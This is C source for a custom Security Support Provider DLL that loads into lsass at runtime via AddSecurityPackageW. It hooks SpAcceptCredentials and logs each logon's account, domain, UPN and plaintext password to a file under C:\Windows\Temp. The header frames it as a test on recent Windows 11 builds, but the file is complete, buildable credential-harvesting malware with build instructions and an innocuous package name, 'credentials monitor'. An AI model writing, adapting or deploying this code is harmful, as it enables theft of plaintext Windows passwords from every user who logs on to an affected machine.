// sspmon.c — minimal SSP for lsass: SpAcceptCredentials plaintext logger
//
// Purpose: test whether the SpAcceptCredentials dispatch still fires on
// Windows 11 26100/26200-line builds (post-wdigest-caching-removal).
// Loaded at runtime via AddSecurityPackageW (no reboot, no registry).
// Writes one line per logon to C:\Windows\Temp\ssp.log.
//
// Build (static CRT, no user32/msvcrt imports into lsass):
//   x86_64-w64-mingw32-gcc -shared -O2 -static -o sspmon.dll sspmon.c

#include <windows.h>
#define SECURITY_WIN32
#include <ntsecapi.h>
#include <sspi.h>
#include <stdio.h>
#include <ntsecpkg.h>

static const wchar_t LOG_PATH[] = L"C:\\Windows\\Temp\\ssp.log";

// UNICODE_STRING -> printable ASCII (no CRT)
static int UsToAscii(const UNICODE_STRING *us, char *out, int cap)
{
	int n = 0;
	if(!us || !us->Buffer) { out[0] = 0; return 0; }
	for(USHORT i = 0; i < us->Length / 2 && n < cap - 4; i++)
	{
		wchar_t c = us->Buffer[i];
		if(c >= 0x20 && c < 0x7f) out[n++] = (char) c;
		else if(!c) out[n++] = '.';
		else out[n++] = '?';
	}
	out[n] = 0;
	return n;
}

static void AppendLine(const char *line, DWORD len)
{
	HANDLE f = CreateFileW(LOG_PATH, FILE_APPEND_DATA | SYNCHRONIZE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(f == INVALID_HANDLE_VALUE) return;
	SetFilePointer(f, 0, NULL, FILE_END);
	DWORD w = 0;
	WriteFile(f, line, len, &w, NULL);
	CloseHandle(f);
}

static NTSTATUS NTAPI MyAcceptCredentials(SECURITY_LOGON_TYPE LogonType,
	PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials,
	PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
	char acct[128] = "", user[128] = "", dom[128] = "", pass[128] = "", upn[128] = "", dns[128] = "";
	UsToAscii(AccountName, acct, sizeof(acct));
	UsToAscii(&PrimaryCredentials->DownlevelName, user, sizeof(user));
	UsToAscii(&PrimaryCredentials->DomainName, dom, sizeof(dom));
	UsToAscii(&PrimaryCredentials->Password, pass, sizeof(pass));
	UsToAscii(&PrimaryCredentials->Upn, upn, sizeof(upn));
	UsToAscii(&PrimaryCredentials->DnsDomainName, dns, sizeof(dns));

	char line[1024];
	int n = snprintf(line, sizeof(line) - 2,
		"tick=%llu type=%lu acct=%s user=%s dom=%s pass=%s upn=%s dns=%s\r\n",
		(unsigned long long) GetTickCount64(), (unsigned long) LogonType,
		acct, user, dom, pass, upn, dns);
	if(n > 0) AppendLine(line, (DWORD) n);
	return 0;
}

static NTSTATUS NTAPI MyGetInfo(PSecPkgInfo PackageInfo)
{
	static char name[] = "SspMonitor";
	static char comment[] = "credentials monitor";
	PackageInfo->fCapabilities = 0;
	PackageInfo->wVersion = 1;
	PackageInfo->wRPCID = 0;
	PackageInfo->cbMaxToken = 0;
	PackageInfo->Name = name;
	PackageInfo->Comment = comment;
	return 0;
}

static NTSTATUS NTAPI MyInitialize(ULONG, PWSTR) { return 0; }
static NTSTATUS NTAPI MyShutdown(void) { return 0; }

static const SECPKG_FUNCTION_TABLE Table = {
	.InitializePackage = NULL,
	.LogonUser = NULL,
	.CallPackage = NULL,
	.LogonTerminated = NULL,
	.CallPackageUntrusted = NULL,
	.CallPackagePassthrough = NULL,
	.LogonUserEx = NULL,
	.LogonUserEx2 = NULL,
	.Initialize = NULL,
	.Shutdown = MyShutdown,
	.GetInfo = MyGetInfo,
	.AcceptCredentials = MyAcceptCredentials,
	.AcquireCredentialsHandle = NULL,
	.QueryCredentialsAttributes = NULL,
	.FreeCredentialsHandle = NULL,
	.SaveCredentials = NULL,
	.GetCredentials = NULL,
	.DeleteCredentials = NULL,
	.InitLsaModeContext = NULL,
	.AcceptLsaModeContext = NULL,
	.DeleteContext = NULL,
	.ApplyControlToken = NULL,
	.GetUserInfo = NULL,
	.GetExtendedInformation = NULL,
	.QueryContextAttributes = NULL,
	.AddCredentials = NULL,
	.SetExtendedInformation = NULL,
	.SetContextAttributes = NULL,
	.SetCredentialsAttributes = NULL,
};

__declspec(dllexport) NTSTATUS SEC_ENTRY SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion,
	PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
	(void) LsaVersion;
	*PackageVersion = 0x00010000;
	*pcTables = 1;
	*ppTables = (PSECPKG_FUNCTION_TABLE) &Table;
	return 0;
}

__declspec(dllexport) NTSTATUS SEC_ENTRY SpUserModeInitialize(ULONG LsaVersion, PULONG PackageVersion,
	PSECPKG_USER_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
	(void) LsaVersion;
	*PackageVersion = 0x00010000;
	*pcTables = 0;
	*ppTables = NULL;
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r)
{
	(void) h; (void) reason; (void) r;
	return TRUE;
}
